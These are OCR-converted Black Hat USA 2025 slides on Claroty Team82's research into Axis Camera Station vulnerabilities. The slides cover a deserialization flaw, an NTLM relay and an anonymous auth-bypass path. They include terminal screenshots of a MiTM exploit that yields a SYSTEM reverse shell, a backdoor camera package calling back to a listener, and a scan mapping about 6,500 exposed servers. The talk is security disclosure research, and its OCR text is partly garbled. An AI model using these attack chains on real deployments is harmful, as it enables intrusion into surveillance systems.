---
title: "Turning Camera Surveillance on its Axis"
speakers: ["Noam Moshe"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Noam Moshe_Turning Camera Surveillance on its Axis.pdf"
pages: 68
sha256: "31dd5e8365b634b2f788427bf92b379f61c553cc751c64b47b363e117074bb35"
text_chars: 15015
ocr_pages: 23
has_ocr: true
redacted_secrets: 0
ocr_confidence: 88.7
ocr_unreliable_blocks: 0
vision_verified_blocks: 2
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:18:00Z"
---
# Turning Camera Surveillance on its Axis

**Speakers:** Noam Moshe  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Noam Moshe_Turning Camera Surveillance on its Axis.pdf` (68 pages)


## Slide 1

## **Turning Camera Surveillance on its Axis**

**Noam Moshe Claroty Research, Claroty Team82**


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CLAROTY
T=AM
Turning Camera Surveillance
on its Axis
Noam Moshe
Claroty Research, Claroty Team82
```

## Slide 2

#### **$whoami**

**Noam Moshe** Vulnerability researcher & Team Lead at Claroty Team82 - mostly breaking IoT clouds. Master of Pwn @ Pwn2Own ICS 2023.

## Slide 3

**I want to hack** **_Big Company Inc._**


> Recovered by OCR — confidence 90/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
| want to hack Big Company Inc.
180.55 USD
+0.79 (0.44%) # today
Closed: 3 Jul, 16:59 GMT-4 + Disclaimer
After hours 180.54 —
181.(
180.16 USD 09:35
180.0 4
178
11:00
Open 179.82
High 180.77
Low 178.19
Max
15:00
52-wk high
52-wk low
Qtrly Div Amt
```

## Slide 4

#### **But how?**

- Searched for exposed services

- Found an interesting service

- What is **axis.remoting protocol** ?


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 89/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
But how?

• Searched for exposed services
• Found an interesting service
• What is axis.remoting protocol ?

[right-hand scan result panel]
HTTP 55756/TCP                                        07/05/2025 08:54 UTC

Software                                        VIEW ALL DATA      ➜ GO
  🔍 Microsoft Windows ↗
  🔍 Microsoft HTTP API 2.0 ↗

Details
https://184.176.222.218:55756/
                Status  404  Not Found
             Body Hash  sha1:a66898b36c94c53766e66c1a7aaeb149447ec083
            HTML Title  Not Found
         Response Body  EXPAND

TLS
Handshake
      Version Selected  TLSv1_2
       Cipher Selected  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384

Certificate
           Fingerprint  43c053f29be29b1811c4e48a2872ed1c5e27b9bb2c89f3b3e8d679cc64867f0a
               Subject  CN=DESKTOP-3FH7UI5.axis.remoting
                Issuer  CN=DESKTOP-3FH7UI5.axis.remoting
                 Names  DESKTOP-3FH7UI5.axis.remoting

Fingerprint
                  JARM  2ad2ad16d00000022c2ad2ad2ad2ad46ff59a659b30fd8aeaa6755c67691b4
                  JA3S  364ff14b04ef93c3b4cfa429d729c0d9

[zoomed callout box, lower left]
Certificate
   Fingerprint  43c053f29be29b1811c4e48a2872ed1c5 (cut off at box edge)
       Subject  CN=DESKTOP-3FH7UI5.axis.remoting   (".axis.remoting" underlined in red)
        Issuer  CN=DESKTOP-3FH7UI5.axis.remoting
         Names  DESKTOP-3FH7UI5.axis.remoting
```

## Slide 5

#### **Axis Cameras**

- IP Camera

- OS is Axis OS (Custom Linux)

- Download firmware from Axis website

- Managed via web interface

   - Configuration, camera feed..

## Slide 6

**Most companies have more than 1 camera…**

## Slide 7

#### **Axis Camera Station / Device Manager**

- **Manages Axis cameras**

   - Discovery, config, firmwares

Axis
Camera
Station


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Axis Camera Station / Device Manager
e Manages Axis cameras
¢ Discovery, config, firmwares
Type to filter
% Devices
Add devices
Cameras
Other devices
Stream profiles
Image configuration
PTZ presets
Management
External data sources
Time synchronization
Add devices
Select the devices in your network that you want to add to the server. You can find the added devices under eit
Manual search...
Name
Enter stream URLs...
IP Address
10.1.48.12
Refresh
Include prerecorded video fe }
Hostname
MAC address
```

## Slide 8

#### **Axis Camera Station / Device Manager**

###### • Live feed view and video recording

Axis
Camera
Station


> Recovered by OCR — confidence 86/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
is Camera Station 7 Device Manager
¢ Live feed view and video
recording AXIS a
COMMUNICATIONS
AXIS M3085-V Network Camera
```

## Slide 9

**How its used**

## Slide 10

#### **On-Prem vs. Cloud versions**

- Axis Secure Remote Access (not Axis.Remoting)

   - **Pro:** Does not require exposing services to the internet

   - **Con:** pay-per-traffic - can be expensive

- On-Prem installation (uses Axis.Remoting)

   - **Pro:** Free to use

   - **Con:** Need to expose services to the internet

Axis
Camera
Station

## Slide 11

#### **What about remote access?**

- Tons of orgs choose on-prem

   - Connect to their servers remotely

- To stay secure - Axis implemented secure protocol

•
Fully encrypted and authenticated binary
protocol
Axis
Camera
Station

## Slide 12

#### **On-Prem Connection**

**Axis Camera Station Clients WAN**

Big
Company
Inc.

## Slide 13

#### **On-Prem Connection**

**Axis Camera Station Clients WAN Attacker**

**Big Company Inc.**

## Slide 14

#### **On-Prem Connection**

**Axis Camera Station Clients WAN Attacker**

**Server controls cameras**

**Big Company Inc.**

## Slide 15

6,000+ servers
around the
world!!! Big
Company
Gov
Inc.
Agency
WAN
University
Attacker

## Slide 16

**Let’s Deep Dive!**

## Slide 17

#### **Axis Camera Station / Device Manager**

- Windows .NET applications

   - Client and server

- Uses Axis.Remoting protocol

   - Wrapped in **mTLS**

- Requires authentication

   - Windows Host/Domain Credentials

## Slide 18

**Let’s Unwrap the protocol!**

## Slide 19

#### **MiTM the Connection with mTLS**

**Axis Camera Station Clients**

MiTM
Axis Camera
Station

## Slide 20

#### **Let’s analyze the protocol!**

- **User-Agent:** protocol name (Axis.Remoting)

- **NTLMSSP** : Authentication method (NTLM Challenge Response)

- **Hostname** : name of computer

- • **Request/Response** : JSON-based Service::Method pairs

- **Service, Method** : the logic to invoke on the server

## Slide 21

#### **ServiceContract**

- **ServiceContract** is used

- Client can invoke functions (contracts) on the server

- Common RPC in .NET

## Slide 22

**What happens when we have a complicated function?**


> Recovered by OCR — confidence 91/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What happens when we have a complicated function?
[ServiceContract]
{
Task<LogOnDto> LogOnAsync(Uri uri, ClientInformationDto clientInformationDto, CommunicationType communicationType,
T ct);
Task LogOffAsync(ServerIdDto serverId,
Task LogOff2Async(Uri uri,
```

## Slide 23

**What happens when we have a complicated function?**


> Recovered by OCR — confidence 91/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What happens when we have a complicated function?
[ServiceContract]
Task<LogOnDto> LogOnAsync(Uri uri, ClientInformationDto clientInformationDto, CommunicationType communicationType,
Task LogOff2Async(Uri uri, t ct):
}
}
```

## Slide 24

**What happens when we have a complicated function?**


> Recovered by OCR — confidence 90/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What happens when we have a complicated function?
ClientinformationDto clientiInformationDto,
namespace WinddéwsClientApi .Common. Remoting
{
publi lass ClientInformationDto : Dto
{
public ClientInformationDto(string machineName, string machineWindowsUserName, string machineWindowsUserSid, string
preferredLanguage)
{
this. = machineName;
= machineWindowsUserName;
this. = machineWindowsUserSid;
this. = preferredLanguage;
}
```

## Slide 25

#### **Parameter Deserialization (CVE-2025-30023)**

- Non-primitive params are deserialized

- Using **TypeNameHandling.Auto** → Super dangerous!

## Slide 26

**Example Request**


> Recovered by OCR — confidence 80/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Example Request
CLIENT --> SERVER DATA:
"Request": {
"Id": "fY¥pAWaAoNNf9",
"Service": "SessionFacade",
"Method": "LogOnAsync",
"Parameters": {
"$type": welindowsClientApi Common. Remoting. ClientInformationDto, WindowsClientApi",
"MachineName": "DESKTOP- wy
"PreferredLanguage": "en",
"communicationType": 1,
"ct": “audcKz4EZann"
```

## Slide 27

### **We have a deserialization vulnerability! Let’s exploit it**

## Slide 28

#### **Connection Lifecycle**

mTLS connection

Start Axis.Remoting

NTLMSSP
Challenge
Response

Axis.Remoting Req/Resp (deserialization)

## Slide 29

###### **This is auth!**

mTLS connection

Start Axis.Remoting

NTLMSSP
Challenge
Response

Axis.Remoting Req/Resp (deserialization)

## Slide 30

#### **What we have so far**

- We have serialization vulnerability (== RCE)

   - But it requires authentication

- But we can exploit it in another form!

## Slide 31

#### **Step 1: We MiTM the connection**

**Axis Camera Station Client** Attacker **MITM**

Axis Camera
Station

## Slide 32

**Step 2: Client authenticates (NTLMSSP) to server and we pass-the-challenge (CVE-2025-30024)**

NTLM
Axis Camera  REQ
Station Client
NTLM
RESP
Attacker
MITM
Axis Camera
Station

## Slide 33

#### **Step 3: After Auth - Inject Deserialization payload**

REQ
Axis Camera
Station Client
Payload
Attacker
MITM
Axis Camera
Station

## Slide 34


> Recovered by OCR — confidence 92/100 on the text kept, 50/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
YSoSerial.Net
CLIENT --> SERVER DATA:
Modified request:
"$type": "System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral,
"System.Security.ClaimsIdentity.actor":
```

## Slide 35

**Step 4: Reverse Shell on Server!**


> Recovered by OCR — confidence 83/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Step 4: Reverse Shell on Server!
=| [a=] AcsService.exe NT AUTHORITY...
conhost.exe NT AUTHORITY‘...
mp (=| £9 powershell.exe NT AUTHORITY’...
[root@LocaLhost axis]# python3 mitm_expLoit.py [root@Localhost axis]# nc -lvk 5050
[+] Setting up MiTM listener! Ncat: Version 7.5@ ( https://nmap.org/ncat )
[+] Received connection from client! forwarding to server|Ncat: Listening on :::505@
[+] Forwarding NTLMSSP ChalLenge/Response Ncat: Listening on 0.0.0.0:5050
[+] Auth completed! Injection RevShell payload Ncat: Connection from 10.10.7.57.
[+] You should get reverse shell any minute now! Ncat: Connection from 10.10.7.57:54098.
[root@LocaLhost axis ]# Microsoft Windows [Version 10.0.19045.5965]
(Cc) Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami
whoami
nt authority\system
```

## Slide 36

#### **Side Note - We can do the same for the client!**

Payload
Axis Camera
Station Client
Attacker

Resp
Axis Camera
Station

## Slide 37

**Executing Code on Cameras (using legitimate features)**


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Executing Code on
Cameras
(using legitimate features)
THERE'S MORE
```

## Slide 38

#### **Execute Code on Cameras**

- Admins can install **packages** on cameras

   - Super modular!

- Anyone can create their own…

- Let’s use it to run code on cameras!

###### **Axis Camera Station**

## Slide 39

#### **Axis ACAP SDK on Github**

- Tons of examples

- Super easy to build a package

- Uses docker to build for multiple archs

   - X86, AARCH64, ARM etc…

## Slide 40

**Building a Package**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Building a Package

➜  hello-world git:(main) ✗ sudo docker build --build-arg ARCH=aarch64 --tag mal-package .

DEPRECATED: The legacy builder is deprecated and will be removed in a future release.
            Install the buildx component to build images with BuildKit:
            https://docs.docker.com/go/buildx/

Sending build context to Docker daemon  132.6kB
Step 1/9 : ARG ARCH=armv7hf
Step 2/9 : ARG VERSION=12.5.0
Step 3/9 : ARG UBUNTU_VERSION=24.04
Step 4/9 : ARG REPO=axisecp
Step 5/9 : ARG SDK=acap-native-sdk
Step 6/9 : FROM ${REPO}/${SDK}:${VERSION}-${ARCH}-ubuntu${UBUNTU_VERSION}
 ---> 160f80e5e1dd
Step 7/9 : COPY ./app /opt/app/
 ---> Using cache
 ---> 324679a4ae57
Step 8/9 : WORKDIR /opt/app
 ---> Using cache
 ---> 748d8352b612
Step 9/9 : RUN . /opt/axis/acapsdk/environment-setup* && acap-build ./
 ---> Using cache
 ---> 913b2369a865
Successfully built 913b2369a865
Successfully tagged mal-package:latest
```

## Slide 41

**Building a Package**


> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Building a Package
Apps
x ly Add app Find more apps Allow unsigned apps Allow root-privileged apps
@ AXIS Object Analytics
Version: 1.12.28 Open
Axis Communications
```

## Slide 42


> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ Backdoor Pacakge
Version: 1.0.0
UNKNOWN
Apps
Allow unsigned apps Allow root-privileged apps
@ Backdoor Pacakge
Version: 1.0.0 Open
UNKNOWN
@ AXIS Object Analytics
Open
Version: 1.12.28
Axis C i ° ‘
ener + build main) x nc -Lvk 9092
Listening on @.0.0.@ 9092
Connection received on 44368
GET /RCE?user=uid=999(acap- ) HTTP/1.1
Host: 79092
User-Agent: curl/8.5.@
Accept: */*
```

## Slide 43

## **MiTM != preauth**

###### **Let’s make it preauth**


> Recovered by OCR — confidence 82/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MiTM != preauth
Let's make it preauth
} iis THIS’ AUTH BYPASS?
```

## Slide 44

#### **I <3 Fallback Protocols!**

- Axis implemented fallback protocol

   - If regular TCP connection doesn’t work

- Over HTTP with AES encryption??

**axis.remoting vulnerable protocol**

## Slide 45

**Still requires auth**


> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Still requires auth
<
G
Windows Security
Sign in to access this site
Authorization required by http://127.0.0.1:55752
OK Cancel
```

## Slide 46

#### **Still requires auth**

##### **If we use creds - browser is just stuck forever…**


> Recovered by OCR — confidence 89/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
till requires auth
€ G © 127.0.0.1:55752
Windows Security x
browser is just stuck
— | forever...
OK Cancel
```

## Slide 47

#### **Let’s understand this protoCOOL!**

WAT
WAT
WAT
WAT

## Slide 48

##### **Step 1: HTTP Connect With Credentials (WWW-Authenticate)**

RX
GET /
Axis Camera
Station Client Return Channel (ID)
Axis Camera

Axis Camera
Station

## Slide 49

#### **Step 2: New HTTP Socket (Using the Channel)**

**Axis Camera Station Client**

TX
GET /{Channel}
Axis Camera
Station

## Slide 50

#### **Step 3: We now have TX and RX “Streams”**

RX
TX
Axis Camera
Station Client
Axis Camera
Station

## Slide 51

#### **Step 4: Each Side sends PubKey**

PubKey
RX
TX
Axis Camera
Station Client PubKey
Axis Camera
Station

## Slide 52

#### **Step 5: Each Side sends AES key**

Encrypted AES Key
RX
TX
Axis Camera
Station Client Encrypted AES Key
Axis Camera
Station

## Slide 53

##### **Step 6: Regular Communication (encrypted with AES)**

Encrypted msg
RX
TX
Axis Camera
Station Client Encrypted msg
Axis Camera
Station

## Slide 54

## Slide 55

#### **Axis.Remoting HTTP Protocol**

- Encrypted binary socket over HTTP

   - Weird way to implement it

- Uses both symmetric and asymmetric encryption

- ==> Is it more secure?

## Slide 56

#### **Axis.Remoting HTTP Protocol**

- Encrypted binary socket over HTTP

   - Weird way to implement it

- Uses both symmetric and asymmetric encryption

- ==> Is it more secure?

- **It has the same deserialization vulnerability - but we still need auth bypass!**

## Slide 57

**Web Server Authentication Scheme**


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Web Server Authentication Scheme
(serverUri.
webServer.
webServer. AuthenticationSchemes.
Negotiate Negotiates with the client to determine the authentication scheme.
If both client and server support Kerberos, it is used; otherwise,
NTLM is used.
```

## Slide 58

**Super Duper Secret Server Authentication Scheme (CVE-2025-30026)**


> Recovered by OCR — confidence 84/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Super Duper Secret Server Authentication Scheme _
(CVE-2025-30026)
2
‘ring text = serverUri + "_
HttpListener webServerAnonymous = new HttpListener();
webServerAnonymous. = true;
webServerAnonymous . .Add(text) ;
webServerAnonymous.Start();
Anonymous 32768 Specifies anonymous authentication.
```

## Slide 59

#### **Exploitation Plan**

- **Step 1:** Use /_/ secret path

   - Bypass auth

- **Step 2:** Implement weird comm protocol

- **Step 3:** ???

- **Step 4: Preauth RCE!**

## Slide 60

#### **And Then - Pivot to Cameras!**

**Axis Camera Station**


> Recovered by OCR — confidence 81/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Listening on 0.0.0.0 9092
Connection received on
echo AXIS Camera
AXIS Camera
7
*
—_
= =
lo] ~ . > build main) x nc -lvk 9092
— \ Listening on @.0.0.@ 9092
ail 3 . Connection received on
. “—_, echo AXIS Camera
Axis Camera ; AXIS Camera
Station
~ build main) x nc -lvk 9092
Listening on 0.0.0.0 9092
Connection received on
echo AXIS Camera
AXIS Camera
```

## Slide 61

**Understanding the Afterefect! f**

## Slide 62

#### **Internet-Exposed Instances**

• Using internet scanning services (Shodan, Censys) - we discover ~6,500 exposed devices!!

- Almost 4,000 in the US!

## Slide 63

#### **Mapping Targets**

- Because the server uses **NTLMSSP** - it advertises its domain!

- We can simply connect to an instance and **query it**

- creating a map of **~6,500** instances

## Slide 64

#### **Remember this?**

- **…**

- **NTLMSSP** : Authentication method (Windows)

- **Hostname** : hostname of host

- **…**

This includes **Domain** !!

## Slide 65

**Mapping Targets**


> Recovered by OCR — confidence 88/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Mapping Targets
7
1
7
1
2
7
1
1
4
1
6
1
8
6
1
7
1
1
7
1
2
1
8
2
6
A
server_ip
8
c
server_port ad_domain_name
55
55
55
55
55
55
55
55
55
5S
55
55
55
55
55
55
55
55
55
55
55
55
55
55
55
55
55
LE -P3
MA 04
RCC
LE ‘2020
AXISNVR-S
EM A2
AXISNVR-F
SMCCAMSRV2022
DI
[ 1600
AXISNVR-
SUPERIOR
AXISNVR-
DESKTOP.
DVRA?
AXISNVR-
AXISNVR-
server_name
ERO1
01
LBBC)
AXISN
EMVI
OASIS
ws
AXISN
SMCCAMSRV2022
D 022
00
AXISNVR-
DESKTOP-
DVRAZ
{ -11
AXISNVR-E
AXISNVR-C
MS27
BAREO1
LMM_7
C1443
E
dns_domain_name
Ler
SE
t 04
local
AXISNVR-S
AXISNVR-
SMCCAMSRV2022
00
AXISNVR-
local
AXISNVR-9
DESKTOP-6
11
AXISNVR-
AXISNVR-
Lenovo-P3
SEF
04
-loca'
AXISNVR-S
AH
local
AXISNVR-
SMCCAM
| 00
axis1.s
AXISNVR-£
DVRA2
R
AXISNVR-EJ
AXISNVR-GI
MS.
lo
io
3
G
parent_dns_domain
None
None
None
None
None
local
None
None
= com
None
local
None
None
None
None
None
loca
None
tal
io
None
```

## Slide 66

#### **Why so many exposed?**

- Many countries **banned chinese-made** surveillance

- Remote access is need for this service

   - For multiple site installations, remote monitor etc…

- People believe the protocol is **secure** because it is **encrypted**

## Slide 67

#### **Aftermath**

- We reported all of these vulnerabilities to Axis Solutions

- They were **super professional** and and fixed all of the vulnerabilities

   - Really! i’ve never got an email response within 10 minutes of reporting!

- They’ve worked hard to fix everything, kudos to them!!

## Slide 68

# **Thank you**

©Copyright Claroty. All rights reserved


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Thank you
CLAROTY
T=AM
©Copyright Claroty. All rights reserved
```
